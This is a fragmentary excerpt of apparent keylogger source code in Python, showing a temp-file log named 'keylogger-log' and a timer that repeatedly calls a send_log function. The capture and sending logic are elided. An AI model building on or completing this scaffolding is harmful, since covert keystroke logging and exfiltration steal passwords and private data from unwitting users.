...
INTERVAL = 2.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.
...
def send_log(LOG_LOC): # send log
    try:
        ...
        pass
    threading.Timer(INTERVAL, send_log, args=[LOG_LOC]).start() # start sending logs again after the amount of seconds specified in INTERVAL
...
with tempfile.TemporaryDirectory() as temp_dir:
    LOG_LOC = fr'{temp_dir}\keylogger-log'
    threading.Timer(INTERVAL, send_log, args=[LOG_LOC]).start()  # start sending logs after the amount of seconds specified in INTERVAL. An interval is set before the first send so there is time for keys to be captured and so an empty file isn't sent.
    with open(LOG_LOC, 'w') as l:  # create the file to avoid any errors
        pass
